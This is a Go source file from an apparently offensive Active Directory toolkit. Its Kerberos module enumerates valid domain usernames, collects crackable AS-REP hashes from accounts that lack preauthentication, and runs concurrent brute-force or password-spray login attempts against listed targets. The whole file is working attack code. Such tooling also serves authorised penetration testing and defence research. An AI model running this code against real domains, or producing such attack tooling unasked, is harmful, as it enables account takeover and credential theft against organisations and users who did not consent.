package goad

import (
	"fmt"
	"sync"

	"github.com/5amu/goad/kerberos"
)

type Krb5Options struct {
	Targets struct {
		TARGETS []string `description:"Provide target IP/FQDN/FILE"`
	} `positional-args:"yes"`

	Connection struct {
		Username string `short:"u" description:"Provide username (or FILE)"`
		Password string `short:"p" description:"Provide password (or FILE)"`
		Domain   string `short:"d" long:"domain" description:"Provide domain"`
	} `group:"Connection Options" description:"Connection Options"`

	Mode struct {
		Bruteforce bool `long:"brute" description:"Bruteforce provided user and pass (can be pass spray when only 1 password is specified)"`
		UserEnum   bool `long:"user-enum" description:"enumerate valid usernames via kerberos"`
	} `group:"Attack Mode"`

	BruteforceStrategy struct {
		ClusterBomb bool `long:"clusterbomb" description:"payload sets in clusterbomb mode (default)"`
		Pitchfork   bool `long:"pitchfork" description:"payload sets in pitchfork mode"`
	} `group:"Bruteforce Strategy"`

	targets     []string
	credentials []credential
}

func (o *Krb5Options) Run() error {
	for _, t := range o.Targets.TARGETS {
		o.targets = append(o.targets, sliceFromString(t)...)
	}

	if o.BruteforceStrategy.Pitchfork {
		o.credentials = NewCredentialsPitchFork(
			sliceFromString(o.Connection.Username),
			sliceFromString(o.Connection.Password),
		)
	} else {
		o.credentials = NewCredentialsClusterBomb(
			sliceFromString(o.Connection.Username),
			sliceFromString(o.Connection.Password),
		)
	}

	var f func(string) error
	if o.Mode.UserEnum {
		f = o.userenum
	} else if o.Mode.Bruteforce {
		f = o.bruteforce
	} else {
		return fmt.Errorf("nothing to do")
	}

	var wg sync.WaitGroup
	for _, target := range o.targets {
		wg.Add(1)
		go func(t string) {
			if err := f(t); err != nil {
				fmt.Println(err)
			}
			wg.Done()
		}(target)
	}
	wg.Wait()
	return nil
}

func (o *Krb5Options) userenum(target string) error {
	client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		return err
	}

	tbl := initializeTable("Module", "Target", "Domain", "Username", "Status", "Hash")
	for _, u := range o.credentials {
		if tgs, err := client.GetAsReqTgt(u.Username); err != nil {
			_, ok := err.(*kerberos.ErrorRequiresPreauth)
			if ok {
				tbl.AddRow("KRB5", target, o.Connection.Domain, u.Username, "Requires Preauth", "")
			} else {
				tbl.AddRow("KRB5", target, o.Connection.Domain, u.Username, "Does Not Exist", "")
			}
		} else {
			hash := tgs.Hash
			tbl.AddRow("KRB5", target, o.Connection.Domain, u.Username, "No Preauth", hash) //fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
		}
	}
	tbl.Print()
	return nil
}

func (o *Krb5Options) bruteforce(target string) error {
	client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		return err
	}

	for _, u := range o.credentials {
		if ok, _ := client.TestLogin(u.Username, u.Password); ok {
			fmt.Printf("[+] Login successful! %s:%s\n", u.Username, u.Password)
		} else {
			fmt.Printf("[-] %s:%s WRONG CREDENTIALS\n", u.Username, u.Password)
		}
	}
	return nil
}
